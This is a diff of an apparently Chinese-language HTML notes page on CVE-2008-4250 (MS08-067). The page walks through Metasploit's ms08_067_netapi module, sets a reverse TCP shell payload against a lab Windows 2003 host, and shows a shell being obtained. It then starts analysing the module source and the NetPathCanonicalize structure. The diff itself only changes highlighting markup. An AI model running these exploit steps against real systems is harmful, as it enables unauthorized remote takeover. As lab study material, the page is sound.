@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-09-12 Mon 22:21 -->
+<!-- 2022-09-30 Fri 20:57 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>CVE-2008-4250</title>
@@ -15,119 +15,119 @@
 <header>
 <h1 class="title">CVE-2008-4250</h1>
 </header>
-<div id="outline-container-org4a8d843" class="outline-2">
-<h2 id="org4a8d843">Step</h2>
-<div class="outline-text-2" id="text-org4a8d843">
+<div id="outline-container-orga316052" class="outline-2">
+<h2 id="orga316052">Step</h2>
+<div class="outline-text-2" id="text-orga316052">
 </div>
-<div id="outline-container-org608a10b" class="outline-3">
-<h3 id="org608a10b">搜索漏洞利用模块</h3>
-<div class="outline-text-3" id="text-org608a10b">
+<div id="outline-container-org9d65318" class="outline-3">
+<h3 id="org9d65318">搜索漏洞利用模块</h3>
+<div class="outline-text-3" id="text-org9d65318">
 <div class="org-src-container">
-<pre class="src src-bash">msf &gt; search ms08_067
+<pre class="src src-bash"><span style="color: #006DAF;">msf</span> <span style="color: #0000FF;">&gt;</span> search ms08_067
 
-Matching Modules
-================
+<span style="color: #006DAF;">Matching</span> Modules
+<span style="color: #006DAF;">================</span>
 
-   Name                                 Disclosure Date  Rank   Description
-   ----                                 ---------------  ----   -----------
-   exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Microsoft Server Service Relative Path Stack Corruption
+   <span style="color: #006DAF;">Name</span>                                 Disclosure Date  Rank   Description
+   <span style="color: #006DAF;">----</span>                                 <span style="color: #D0372D;">---------------</span>  <span style="color: #D0372D;">----</span>   <span style="color: #D0372D;">-----------</span>
+   <span style="color: #006DAF;">exploit/windows/smb/ms08_067_netapi</span>  2008-10-28       great  Microsoft Server Service Relative Path Stack Corruption
 </pre>
 </div>
 </div>
 </div>
 
-<div id="outline-container-orgcae725a" class="outline-3">
-<h3 id="orgcae725a">选择载荷</h3>
-<div class="outline-text-3" id="text-orgcae725a">
+<div id="outline-container-orgbdcf5e3" class="outline-3">
+<h3 id="orgbdcf5e3">选择载荷</h3>
+<div class="outline-text-3" id="text-orgbdcf5e3">
 <div class="org-src-container">
-<pre class="src src-bash">msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; use exploit/windows/smb/ms08_067_netapi
-msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; show payloads
+<pre class="src src-bash"><span style="color: #006DAF;">msf</span>  exploit<span style="color: #707183;">(</span><span style="color: #006DAF;">ms08_067_netapi</span><span style="color: #707183;">)</span> <span style="color: #0000FF;">&gt;</span> use exploit/windows/smb/ms08_067_netapi
+<span style="color: #006DAF;">msf</span>  exploit<span style="color: #707183;">(</span><span style="color: #006DAF;">ms08_067_netapi</span><span style="color: #707183;">)</span> <span style="color: #0000FF;">&gt;</span> show payloads
 
-Compatible Payloads
-===================
+<span style="color: #006DAF;">Compatible</span> Payloads
+<span style="color: #006DAF;">===================</span>
 
-   Name                                             Disclosure Date  Rank    Description
-   ----                                             ---------------  ----    -----------
-...SNIP...
-   generic/shell_reverse_tcp                                         normal  Generic Command Shell, Reverse TCP Inline
-...SNIP...
-msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; set payload generic/shell_reverse_tcp
+   <span style="color: #006DAF;">Name</span>                                             Disclosure Date  Rank    Description
+   <span style="color: #006DAF;">----</span>                                             <span style="color: #D0372D;">---------------</span>  <span style="color: #D0372D;">----</span>    <span style="color: #D0372D;">-----------</span>
+<span style="color: #006DAF;">...SNIP...</span>
+   <span style="color: #006DAF;">generic/shell_reverse_tcp</span>                                         normal  Generic Command Shell, Reverse TCP Inline
+<span style="color: #006DAF;">...SNIP...</span>
+<span style="color: #006DAF;">msf</span>  exploit<span style="color: #707183;">(</span><span style="color: #006DAF;">ms08_067_netapi</span><span style="color: #707183;">)</span> <span style="color: #0000FF;">&gt;</span> set <span style="color: #006DAF;">payload</span> generic/shell_reverse_tcp
 </pre>
 </div>
 </div>
 </div>
 
-<div id="outline-container-org25e712e" class="outline-3">
-<h3 id="org25e712e">攻击载荷配置选项</h3>
-<div class="outline-text-3" id="text-org25e712e">
+<div id="outline-container-org14aebd9" class="outline-3">
+<h3 id="org14aebd9">攻击载荷配置选项</h3>
+<div class="outline-text-3" id="text-org14aebd9">
 <div class="org-src-container">
-<pre class="src src-bash">msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; show options
+<pre class="src src-bash"><span style="color: #006DAF;">msf</span>  exploit<span style="color: #707183;">(</span><span style="color: #006DAF;">ms08_067_netapi</span><span style="color: #707183;">)</span> <span style="color: #0000FF;">&gt;</span> show options
 
-Module options <span style="color: #707183;">(</span>exploit/windows/smb/ms08_067_netapi<span style="color: #707183;">)</span>:
+<span style="color: #006DAF;">Module</span> options <span style="color: #707183;">(</span><span style="color: #006DAF;">exploit/windows/smb/ms08_067_netapi</span><span style="color: #707183;">)</span>:
 
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   RHOST                     yes       The target address
-   RPORT    <span style="color: #D0372D;">445</span>              yes       Set the SMB service port
-   SMBPIPE  BROWSER          yes       The pipe name to use <span style="color: #707183;">(</span>BROWSER, SRVSVC<span style="color: #707183;">)</span>
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   <span style="color: #D0372D;">0</span>   Automatic Targeting
+   <span style="color: #006DAF;">Name</span>     Current Setting  Required  Description
+   <span style="color: #006DAF;">----</span>     <span style="color: #D0372D;">---------------</span>  <span style="color: #D0372D;">--------</span>  <span style="color: #D0372D;">-----------</span>
+   <span style="color: #006DAF;">RHOST</span>                     yes       The target address
+   <span style="color: #006DAF;">RPORT</span>    <span style="color: #D0372D;">445</span>              yes       Set the SMB service port
+   <span style="color: #006DAF;">SMBPIPE</span>  BROWSER          yes       The pipe name to use <span style="color: #707183;">(</span><span style="color: #006DAF;">BROWSER,</span> SRVSVC<span style="color: #707183;">)</span>
 
 
-msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; show targets
+<span style="color: #006DAF;">Exploit</span> target:
 
-Exploit targets:
+   <span style="color: #006DAF;">Id</span>  Name
+   <span style="color: #006DAF;">--</span>  <span style="color: #D0372D;">----</span>
+   <span style="color: #006DAF;">0</span>   Automatic Targeting
 
-   Id  Name
-   --  ----
-   <span style="color: #D0372D;">0</span>   Automatic Targeting
-...SNIP...
-   <span style="color: #D0372D;">5</span>   Windows <span style="color: #D0372D;">2003</span> SP0 Universal
-...SNIP...
-msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; set RHOST 10.10.10.130
-<span style="color: #BA36A5;">RHOST</span> =&gt; 10.10.10.130
-msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; set LPORT <span style="color: #D0372D;">5000</span>
-<span style="color: #BA36A5;">LPORT</span> =&gt; <span style="color: #D0372D;">5000</span>
-msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; set LHOST 10.10.10.128
-<span style="color: #BA36A5;">LHOST</span> =&gt; 10.10.10.128
-msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; set target <span style="color: #D0372D;">5</span>
-<span style="color: #BA36A5;">target</span> =&gt; <span style="color: #D0372D;">5</span>
+
+<span style="color: #006DAF;">msf</span>  exploit<span style="color: #707183;">(</span><span style="color: #006DAF;">ms08_067_netapi</span><span style="color: #707183;">)</span> <span style="color: #0000FF;">&gt;</span> show targets
+
+<span style="color: #006DAF;">Exploit</span> targets:
+
+   <span style="color: #006DAF;">Id</span>  Name
+   <span style="color: #006DAF;">--</span>  <span style="color: #D0372D;">----</span>
+   <span style="color: #006DAF;">0</span>   Automatic Targeting
+<span style="color: #006DAF;">...SNIP...</span>
+   <span style="color: #006DAF;">5</span>   Windows <span style="color: #D0372D;">2003</span> SP0 Universal
+<span style="color: #006DAF;">...SNIP...</span>
+<span style="color: #006DAF;">msf</span>  exploit<span style="color: #707183;">(</span><span style="color: #006DAF;">ms08_067_netapi</span><span style="color: #707183;">)</span> <span style="color: #0000FF;">&gt;</span> set <span style="color: #006DAF;">RHOST</span> 10.10.10.130
+<span style="color: #006DAF;">RHOST</span> =<span style="color: #0000FF;">&gt;</span> 10.10.10.130
+<span style="color: #006DAF;">msf</span>  exploit<span style="color: #707183;">(</span><span style="color: #006DAF;">ms08_067_netapi</span><span style="color: #707183;">)</span> <span style="color: #0000FF;">&gt;</span> set <span style="color: #006DAF;">LPORT</span> <span style="color: #D0372D;">5000</span>
+<span style="color: #006DAF;">LPORT</span> =<span style="color: #0000FF;">&gt;</span> <span style="color: #D0372D;">5000</span>
+<span style="color: #006DAF;">msf</span>  exploit<span style="color: #707183;">(</span><span style="color: #006DAF;">ms08_067_netapi</span><span style="color: #707183;">)</span> <span style="color: #0000FF;">&gt;</span> set <span style="color: #006DAF;">LHOST</span> 10.10.10.128
+<span style="color: #006DAF;">LHOST</span> =<span style="color: #0000FF;">&gt;</span> 10.10.10.128
+<span style="color: #006DAF;">msf</span>  exploit<span style="color: #707183;">(</span><span style="color: #006DAF;">ms08_067_netapi</span><span style="color: #707183;">)</span> <span style="color: #0000FF;">&gt;</span> set <span style="color: #006DAF;">target</span> <span style="color: #D0372D;">5</span>
+<span style="color: #006DAF;">target</span> =<span style="color: #0000FF;">&gt;</span> <span style="color: #D0372D;">5</span>
 </pre>
 </div>
 </div>
 </div>
 
-<div id="outline-container-org97cac86" class="outline-3">
-<h3 id="org97cac86">攻击</h3>
-<div class="outline-text-3" id="text-org97cac86">
+<div id="outline-container-orgb8ed768" class="outline-3">
+<h3 id="orgb8ed768">攻击</h3>
+<div class="outline-text-3" id="text-orgb8ed768">
 <div class="org-src-container">
-<pre class="src src-bash">msf  exploit<span style="color: #707183;">(</span>ms08_067_netapi<span style="color: #707183;">)</span> &gt; exploit
+<pre class="src src-bash"><span style="color: #006DAF;">msf</span>  exploit<span style="color: #707183;">(</span><span style="color: #006DAF;">ms08_067_netapi</span><span style="color: #707183;">)</span> <span style="color: #0000FF;">&gt;</span> exploit
 
-<span style="color: #707183;">[</span>*<span style="color: #707183;">]</span> Started reverse handler on 10.10.10.128:5000
-<span style="color: #707183;">[</span>*<span style="color: #707183;">]</span> Attempting to trigger the vulnerability...
-<span style="color: #707183;">[</span>*<span style="color: #707183;">]</span> Command shell session <span style="color: #D0372D;">2</span> opened <span style="color: #707183;">(</span>10.10.10.128:5000 -&gt; 10.10.10.130:2041<span style="color: #707183;">)</span> at 2020-09-06 08:36:57 -0400
+<span style="color: #707183;">[</span>*<span style="color: #707183;">]</span> <span style="color: #006DAF;">Started</span> reverse handler on 10.10.10.128:5000
+<span style="color: #707183;">[</span>*<span style="color: #707183;">]</span> <span style="color: #006DAF;">Attempting</span> to trigger the vulnerability...
+<span style="color: #707183;">[</span>*<span style="color: #707183;">]</span> <span style="color: #006DAF;">Command</span> shell session <span style="color: #D0372D;">2</span> opened <span style="color: #707183;">(</span><span style="color: #006DAF;">10.10.10.128:5000</span> <span style="color: #D0372D;">-</span><span style="color: #0000FF;">&gt;</span> 10.10.10.130:2041<span style="color: #707183;">)</span> <span style="color: #006DAF;">at</span> 2020-09-06 08:36:57 <span style="color: #D0372D;">-0400</span>
 
-Microsoft Windows <span style="color: #707183;">[</span>Version 5.2.3790<span style="color: #707183;">]</span>
-<span style="color: #707183;">(</span>C<span style="color: #707183;">)</span> Copyright 1985-2003 Microsoft Corp.
+<span style="color: #006DAF;">Microsoft</span> Windows <span style="color: #707183;">[</span>Version 5.2.3790<span style="color: #707183;">]</span>
+<span style="color: #707183;">(</span><span style="color: #006DAF;">C</span><span style="color: #707183;">)</span> <span style="color: #006DAF;">Copyright</span> 1985-2003 Microsoft Corp.
 
-C:\WINDOWS\system32&gt; <span style="color: #6434A3;">echo</span> <span style="color: #008000;">'Successfully!'</span>
+<span style="color: #006DAF;">C:\WINDOWS\system32</span><span style="color: #0000FF;">&gt;</span> <span style="color: #6434A3;">echo</span> <span style="color: #008000;">'Successfully!'</span>
 </pre>
 </div>
 </div>
 </div>
 
-<div id="outline-container-org7f613b5" class="outline-3">
-<h3 id="org7f613b5">分析</h3>
+<div id="outline-container-org1245e0e" class="outline-3">
+<h3 id="org1245e0e">分析</h3>
 </div>
 
-<div id="outline-container-org6569beb" class="outline-3">
-<h3 id="org6569beb">攻击模块源码</h3>
-<div class="outline-text-3" id="text-org6569beb">
+<div id="outline-container-orgc774955" class="outline-3">
+<h3 id="orgc774955">攻击模块源码</h3>
+<div class="outline-text-3" id="text-orgc774955">
 <div class="org-src-container">
 <pre class="src src-ruby"><span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#27492;&#27169;&#22359;&#23558;&#21253;&#21547;Metasploit&#26680;&#24515;&#24211;&#30340;&#25152;&#26377;&#20989;&#25968;</span>
 <span style="color: #006FE0;">require</span> <span style="color: #008000;">'msf/core'</span>
@@ -366,16 +366,16 @@ C:\WINDOWS\system32&gt; <span style="color: #6434A3;">echo</span> <span style="c
 <b>stub</b> 是符合 NetPathCanonicalize 结构的标准调用包头，将触发远程主机上的 Server 服务去调用路径规范化处理函数 <b>NetpwPathCannonicalize，stub</b> 的 <b>srvsvc<sub>NetPathCanonicalize</sub></b> 结构体如下：
 </p>
 <div class="org-src-container">
-<pre class="src src-c"><span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">srvsvc_NetPathCanonicalize</span> {
-    <span style="color: #0000FF;">struct</span> {
-        <span style="color: #0000FF;">const</span> <span style="color: #6434A3;">char</span> *<span style="color: #BA36A5;">server_unc</span>; <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">[unique, charset(UTF16)]</span>
-        <span style="color: #0000FF;">const</span> <span style="color: #6434A3;">char</span> *<span style="color: #BA36A5;">path</span>;       <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">[charset(UTF16)]</span>
-        <span style="color: #6434A3;">uint32_t</span> <span style="color: #BA36A5;">maxbuf</span>;
-        <span style="color: #0000FF;">const</span> <span style="color: #6434A3;">char</span> *<span style="color: #BA36A5;">prefix</span>;     <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">[charset(UTF16)]</span>
-        <span style="color: #6434A3;">uint32_t</span> <span style="color: #BA36A5;">pathflags</span>;
-        <span style="color: #6434A3;">uint32_t</span> *<span style="color: #BA36A5;">pathtype</span>;     <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">[ref]</span>
-    } <span style="color: #BA36A5;">in</span>;
-};
+<pre class="src src-c"><span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">srvsvc_NetPathCanonicalize</span> <span style="color: #707183; background-color: #FFFFFF;">{</span>
+    <span style="color: #0000FF;">struct</span> <span style="color: #7388D6; background-color: #FFFFFF;">{</span>
+        <span style="color: #0000FF;">const</span> <span style="color: #006FE0;">char</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5; font-style: italic;">server_unc</span><span style="color: #333333; background-color: #FFFFFF;">;</span> <span style="color: #8D8D84; font-style: italic;">// [unique, charset(UTF16)]</span>
+        <span style="color: #0000FF;">const</span> <span style="color: #006FE0;">char</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5; font-style: italic;">path</span><span style="color: #333333; background-color: #FFFFFF;">;</span>       <span style="color: #8D8D84; font-style: italic;">// [charset(UTF16)]</span>
+        <span style="color: #006FE0;">uint32_t</span> <span style="color: #BA36A5; font-style: italic;">maxbuf</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+        <span style="color: #0000FF;">const</span> <span style="color: #006FE0;">char</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5; font-style: italic;">prefix</span><span style="color: #333333; background-color: #FFFFFF;">;</span>     <span style="color: #8D8D84; font-style: italic;">// [charset(UTF16)]</span>
+        <span style="color: #006FE0;">uint32_t</span> <span style="color: #BA36A5; font-style: italic;">pathflags</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+        <span style="color: #006FE0;">uint32_t</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5; font-style: italic;">pathtype</span><span style="color: #333333; background-color: #FFFFFF;">;</span>     <span style="color: #8D8D84; font-style: italic;">// [ref]</span>
+    <span style="color: #7388D6; background-color: #FFFFFF;">}</span> <span style="color: #BA36A5; font-style: italic;">in</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+<span style="color: #707183; background-color: #FFFFFF;">}</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
 </pre>
 </div>
 
